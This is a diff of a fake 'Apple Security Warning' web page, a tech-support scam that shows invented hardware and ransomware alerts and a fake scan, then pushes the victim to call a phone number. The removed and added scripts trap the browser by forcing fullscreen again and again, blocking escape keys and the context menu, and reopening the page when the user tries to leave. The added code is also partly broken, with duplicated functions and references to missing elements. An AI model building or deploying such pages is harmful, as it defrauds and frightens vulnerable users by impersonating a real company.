@@ -3,308 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple Security Intelligence</title>
+    <title>⚠ Apple Security Warning ⚠</title>
     <style>
         :root {
             --apple-blue: #007AFF;
             --apple-red: #FF3B30;
             --apple-gray: #F5F5F7;
             --apple-dark: #1D1D1F;
+            --apple-green: #34C759;
         }
 
         body {
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
-            background: var(--apple-gray);
-            height: 100vh;
-            overflow: hidden;
+            background: linear-gradient(white, var(--apple-blue));
             color: var(--apple-dark);
-        }
-
-        /* Header Styles */
-        .apple-header {
+            height: 100vh;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 10px 20px;
-            background: var(--apple-dark);
-            color: white;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 10002; /* Ensure it's above other elements */
-        }
-
-        .apple-header .apple-logo {
-            width: 40px;
-            height: 40px;
-            background-image: url("apple_logo.svg"); /* Path to your Apple logo SVG */
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-
-        .apple-header nav a {
-            color: white;
-            text-decoration: none;
-            margin: 0 15px;
-            font-size: 14px;
-        }
-
-        .apple-header nav a:hover {
-            text-decoration: underline;
-        }
-
-        /* Footer Styles */
-        .apple-footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
+            justify-content: center;
             text-align: center;
-            padding: 10px 0;
-            background: var(--apple-dark);
-            color: white;
-            font-size: 12px;
-            z-index: 10002; /* Ensure it's above other elements */
+            flex-direction: column;
         }
 
-        .apple-container {
-            position: fixed;
-            top: 80px; /* Adjusted to avoid overlap with header */
-            left: 20px;
-            width: 120px;
-            height: 120px;
-            z-index: 10001; /* Higher than securityOverlay */
-        }
-
+        /* Apple Logo */
         .apple-logo {
-            width: 100%;
-            height: 100%;
-            background-image: url("apple_logo.svg"); /* Path to your Apple logo SVG */
+            width: 80px;
+            height: 80px;
+            background-image: url("apple-logo-blue.png"); /* Replace with Apple logo */
             background-size: contain;
             background-repeat: no-repeat;
             background-position: center;
-            transition: transform 0.3s ease;
+            margin-bottom: 20px;
         }
 
-        .apple-logo:hover {
-            transform: scale(1.1);
-            cursor: pointer;
+        /* Security Container */
+        .security-container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
         }
 
-        /* Centered Scan Button */
-        #scanButton {
-            position: fixed;
-            top: 80px; /* Adjusted to avoid overlap with header */
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--apple-blue);
+        h1 {
+            font-size: 20px;
+            color: var(--apple-red);
+        }
+
+        p {
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        /* Scan Button */
+        .scan-button {
+            background: var(--apple-red);
             color: white;
             border: none;
             padding: 12px 24px;
             border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
+            font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0, 122, 255, 0.2);
-            z-index: 1000; /* Below the logo */
+            transition: all 0.3s ease;
         }
 
-        /* Security Overlay */
-        #securityOverlay {
-            display: none; /* Initially hidden */
-            position: fixed;
-            top: 0;
-            left: 0;
+        .scan-button:hover {
+            background: darkred;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
             width: 100%;
+            background: var(--apple-gray);
+            height: 8px;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-fill {
             height: 100%;
-            background: #000000; /* Pure Apple black background */
-            z-index: 10000; /* Above everything */
-            color: white; /* White text for contrast */
-            text-align: center;
-            padding-top: 5rem;
+            width: 0;
+            background: var(--apple-green);
+            transition: width 0.5s ease;
         }
 
-        .error-panel {
-            background: rgba(255, 255, 255, 0.1); /* Light background for contrast */
-            border: 1px solid var(--apple-red);
-            border-radius: 8px;
-            padding: 1rem;
-            margin: 2rem auto;
-            width: 80%;
-            max-width: 600px;
-            text-align: left;
-            font-family: monospace;
-            color: white; /* White text for contrast */
+        /* Error Message */
+        .error-message {
+            display: none;
+            font-size: 14px;
+            color: var(--apple-red);
+            font-weight: bold;
+            margin-top: 10px;
         }
 
-        /* Warning Animation */
-        @keyframes warningPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+        /* Call Support Button */
+        .call-support {
+            display: none;
+            background: var(--apple-blue);
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
+    <!-- Apple Logo -->
+    <div class="apple-logo"></div>
 
-    <!-- Header -->
-    <header class="apple-header">
-        <div class="apple-logo"></div>
-        <nav>
-            <a href="#">Home</a>
-            <a href="#">Products</a>
-            <a href="#">Support</a>
-            <a href="#">Security</a>
-        </nav>
-    </header>
+    <!-- Security Container -->
+    <div class="security-container">
+        <h1>⚠️ Apple Security Warning ⚠️</h1>
+        <p>Your device might be at risk. Run a quick security check.</p>
+        <p>Apple Security Intelligence Report:</strong>
+                    <p>• T2 Security Chip: Integrity Violation<br>
+                    • Secure Enclave: Cryptographic Failure<br>
+                    • XProtect: Signature Database Corrupted<br>
+                    • AMFI: Code Signature Validation Failed<br>
+                    • Neural Engine: Anomaly Detected</p>    
+        <!-- Scan Now Button -->
+        <button class="scan-button" id="startScan">Scan Now</button>
 
-    <div class="apple-container">
-        <div class="apple-logo"></div>
-    </div>
-
-    <button id="scanButton">Begin Security Scan</button>
-
-    <!-- Full-Screen Security Interface -->
-    <div class="security-overlay" id="securityOverlay">
-        <div class="neural-animation"></div>
-        <h1 style="text-align:center;color:var(--apple-red)">⚠️ CRITICAL SYSTEM THREAT DETECTED</h1>
-        
-        <div class="error-panel">
-            <pre>Apple Security Intelligence Report:
-----------------------------------
-• T2 Security Chip: Integrity Violation
-• Secure Enclave: Cryptographic Failure
-• XProtect: Signature Database Corrupted
-• AMFI: Code Signature Validation Failed
-• Neural Engine: Anomaly Detected</pre>
+        <!-- Progress Bar -->
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
 
-        <div style="text-align:center;margin-top:2rem">
-            <button style="
-                background: var(--apple-red);
-                color: white;
-                border: none;
-                padding: 12px 24px;
-                border-radius: 8px;
-                font-size: 14px;
-                cursor: pointer;
-            ">
-                ☏Dial & Report Apple Security Response to prevent further damage*Trojan Bad files Found on your network server dns which is infected by a Trojan Horse Ransomware which is vurnlerable Call Apple Immediately its serious  
-            </button>
-        </div>
-		<button style="
-                background: var(--apple-red);
-                color: white;
-                border: none;
-                padding: 12px 24px;
-                border-radius: 8px;
-                font-size: 14px;
-                cursor: pointer;
-            ">
-                ☏ +1 (800) 786- 3414Dial Toll Free USA Helpline  
-            </button>
+        <!-- Error Message -->
+        <p class="error-message" id="errorMessage">
+            ERROR CODE: <strong>0x000A9F</strong> - Security Threat Detected
+        </p>
+
+        <!-- Call Support Button -->
+        <a href="tel:+18001234567" class="call-support" id="callSupport">📞 Call Apple Support</a>
     </div>
-
-    <!-- Footer -->
-    <footer class="apple-footer">
-        &copy; 2023 Apple Inc. All rights reserved.
-    </footer>
-
-    <!-- Audio for Security Breach Warning -->
-    <audio id="warningAudio" src="warning_sound.mp3" preload="auto"></audio>
 
     <script>
-        // Persistent Security State
-        let isLocked = false;
+        function startScan() {
+            document.getElementById("startScan").style.display = "none";
+            document.getElementById("progressBar").style.display = "block";
 
-        // Fullscreen Lock System
-        const enforceFullscreen = () => {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                document.getElementById("progressFill").style.width = `${progress}%`;
+
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    document.getElementById("errorMessage").style.display = "block";
+                    document.getElementById("callSupport").style.display = "inline-block";
+                }
+            }, 700);
+        }
+
+        document.getElementById("startScan").addEventListener("click", startScan);
+    </script>
+	 <script>
+        function enterFullScreen() {
+            const elem = document.documentElement;
             if (!document.fullscreenElement) {
-                document.documentElement.requestFullscreen()
-                    .catch(() => setTimeout(enforceFullscreen, 100));
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen();
+                } else if (elem.mozRequestFullScreen) {
+                    elem.mozRequestFullScreen();
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
             }
-            setTimeout(enforceFullscreen, 100);
-        };
+        }
 
-        // Input Lockdown System
-        const lockdownInputs = () => {
-            // Keyboard Lock
-            document.addEventListener('keydown', e => {
-                if (['Escape', 'F11', 'Meta', 'Alt', 'Tab'].includes(e.key)) {
-                    e.preventDefault();
-                    showWarning();
+        function preventExitFullScreen() {
+            document.addEventListener("fullscreenchange", () => {
+                if (!document.fullscreenElement) {
+                    enterFullScreen();
                 }
             });
-
-            // Mouse Lock
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('mousedown', e => {
-                if (e.button === 1) e.preventDefault(); // Block middle-click
-            });
-        };
-
-        // Visual Warning System
-        const showWarning = () => {
-            const warning = document.createElement('div');
-            warning.style = `
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background: rgba(255, 59, 48, 0.9);
-                color: white;
-                padding: 1.5rem;
-                border-radius: 8px;
-                text-align: center;
-                z-index: 10000;
-                animation: warningPulse 0.5s infinite;
-            `;
-            warning.innerHTML = `
-                <div style="font-size:1.2em">⚠️ UNAUTHORIZED ACCESS ATTEMPT</div>
-                <div style="font-size:0.9em;margin-top:0.5rem">
-                    Security Lockdown Engaged<br>
-                    Apple T2 Chip Activated
-                </div>
-            `;
-            document.body.appendChild(warning);
-            setTimeout(() => warning.remove(), 1500);
-        };
-
-        // Scan Button Handler
-        document.getElementById('scanButton').addEventListener('click', () => {
-            isLocked = true;
-            document.getElementById('securityOverlay').style.display = 'block';
-            enforceFullscreen();
-            lockdownInputs();
-
-            // Play Warning Audio
-            const warningAudio = document.getElementById('warningAudio');
-            warningAudio.play();
-
-            // Simulate Security Scan
-            setTimeout(() => {
-                showWarning();
-                enforceFullscreen();
-            }, 3000);
-        });
-
-        // Persistent State Handling
-        window.addEventListener('beforeunload', e => {
-            if (isLocked) {
-                e.preventDefault();
-                window.open(location.href, '_blank');
-            }
-        });
-
-        // Auto-Start if Locked
-        if (localStorage.getItem('appleSecurityLock')) {
-            document.getElementById('scanButton').click();
         }
-        localStorage.setItem('appleSecurityLock', 'active');
+
+        function startScan() {
+            enterFullScreen();
+            preventExitFullScreen();
+
+            document.getElementById("startScan").style.display = "none";
+            document.getElementById("progressBar").style.display = "block";
+
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                document.getElementById("progressFill").style.width = `${progress}%`;
+                document.getElementById("scanStatus").textContent = `Scanning system files... ${progress}% complete`;
+
+                if (progress >= 90) {
+                    clearInterval(scanInterval);
+                    document.getElementById("errorMessage").style.display = "block";
+                    document.getElementById("progressFill").style.background = "#ff0000";
+                    document.getElementById("scanStatus").textContent = "System Threat Detected!";
+                    document.getElementById("callSupport").style.display = "inline-block";
+                    document.getElementById("qrCode").style.display = "block";
+                }
+            }, 800);
+        }
+
+        document.getElementById("startScan").addEventListener("click", startScan);
+    </script>
+	<script>
+        // Configuration
+        let forceMacMode = false; // Set to true to force Mac version
+        
+        // Detect environment
+        const isMac = navigator.platform.toLowerCase().includes('mac');
+        const isWindows = navigator.platform.toLowerCase().includes('win');
+        const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
+
+        // Apply OS theme
+        function applyOSTheme() {
+            if (forceMacMode || isMac || isSafari) {
+                $('body').addClass('mac-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg');
+                $('#scan-title').text('macOS Security Alert');
+            } else {
+                $('body').addClass('windows-theme');
+                $('.os-logo').attr('src', 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg');
+                $('#scan-title').text('Windows Defender Alert');
+            }
+        }
+
+        // Fullscreen management
+        function enforceFullscreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) {
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            }
+        }
+
+        // Scan functionality
+        $('#start-scan').click(function() {
+            let progress = 0;
+            const scanInterval = setInterval(() => {
+                progress += 10;
+                $('.progress-fill').css('width', `${progress}%`);
+                $('#scan-status').text(`Scanning system files... ${progress}% complete`);
+                
+                if (progress >= 100) {
+                    clearInterval(scanInterval);
+                    $('.emergency-number, .warning-message').fadeIn(500);
+                }
+            }, 800);
+        });
+
+        // Event listeners
+        $(document)
+            .on('click keydown', enforceFullscreen)
+            .on('fullscreenchange', enforceFullscreen);
+
+        // Initial setup
+        applyOSTheme();
+        enforceFullscreen();
     </script>
 </body>
 </html>
